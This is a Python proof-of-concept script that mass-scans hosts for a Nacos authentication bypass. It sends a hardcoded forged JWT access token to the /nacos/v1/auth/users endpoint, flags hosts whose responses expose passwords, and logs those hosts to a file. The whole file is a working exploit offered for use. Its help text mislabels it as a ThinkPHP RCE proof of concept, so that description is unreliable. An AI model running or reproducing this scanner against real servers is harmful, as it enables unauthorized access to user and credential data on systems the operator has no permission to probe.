import argparse
import requests
import re
import urllib3


class attack():
    def check(res, str):
        res = re.search(res, str)
        if res:
            return True
        else:
            return False

    def attack_one(self, rhost):
        httpline = "http://" + rhost.strip()
        payload = {"pageNo": "1", "pageSize": "9",
                   "accessToken": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg4NDcyN30.HZz-hcWTVEObpGuS0XYii0YYXkmLXo7cyP09IgZiBd0"}
        headers = {"Referer": httpline}
        try:
            urllib3.disable_warnings()
            httpline_req = httpline + "/nacos/v1/auth/users"
            requests.get(url=httpline_req, params=payload, headers=headers, verify=False, timeout=5)
            response = requests.get(url=httpline_req, params=payload, headers=headers, verify=False, timeout=5)
            resp_text = response.text
            if response.status_code == 200:
                result = attack.check("password", resp_text)
                if result == True:
                    print(
                        "\033[33m[+]\033[0m" + "\033[33m{}\033[0m".format(httpline) + "\033[33m is vulnerable! \033[0m")
                else:
                    print(
                        "\033[32m[-]\033[0m" + "\033[32m{}\033[0m".format(httpline) + "\033[32m not vulnerable.\033[0m")
            else:
                print("\033[32m[-]\033[0m" + "\033[32m{}\033[0m".format(httpline) + "\033[32m not vulnerable.\033[0m")
        except:
            print("\033[31m[x]\033[0m" + "\033[31m{}\033[0m".format(httpline) + "\033[31m error \033[0m")

    def attack_all(self, file, outfile=None):
        for line in file:
            httpline = "http://" + line.strip()
            payload = {"pageNo": "1", "pageSize": "9",
                       "accessToken": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk"}
            headers = {"Referer": httpline}
            try:
                urllib3.disable_warnings()
                httpline_req = httpline + "/nacos/v1/auth/users"
                requests.get(url=httpline_req, params=payload, headers=headers, verify=False, timeout=5)
                response = requests.get(url=httpline_req, params=payload, headers=headers, verify=False, timeout=5)
                resp_text = response.text
                if response.status_code == 200:
                    result = attack.check("password", resp_text)
                    if result == True:
                        print("\033[33m[+]\033[0m" + "\033[33m{}\033[0m".format(
                            httpline) + "\033[33m is vulnerable! \033[0m")
                        if outfile is not None:
                            with open(outfile, "a") as f:
                                f.writelines(httpline + "\n")
                    else:
                        print("\033[32m[-]\033[0m" + "\033[32m{}\033[0m".format(
                            httpline) + "\033[32m not vulnerable.\033[0m")
                else:
                    print(
                        "\033[32m[-]\033[0m" + "\033[32m{}\033[0m".format(httpline) + "\033[32m not vulnerable.\033[0m")
            except:
                print("\033[31m[x]\033[0m" + "\033[31m{}\033[0m".format(httpline) + "\033[31m error \033[0m")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Thinkphp_Multilingual_Module_Rce Poc by atk7r")
    parser.add_argument(
        '-rh', '--rhost', type=str, metavar="remote_host",
        help='Please input host to scan.'
    )
    parser.add_argument(
        '-f', '--file', type=argparse.FileType('r'), metavar="file_path",
        help='Please input file path to scan.'
    )
    parser.add_argument(
        '-o', '--outfile', metavar="outfile_path",
        help="Please input path for output file."
    )
    args = parser.parse_args()
    if args.rhost:
        run = attack()
        run.attack_one(args.rhost)
        exit()
    if args.file:
        run = attack()
        run.attack_all(args.file, args.outfile)
    else:
        print("Please input -h for help.")
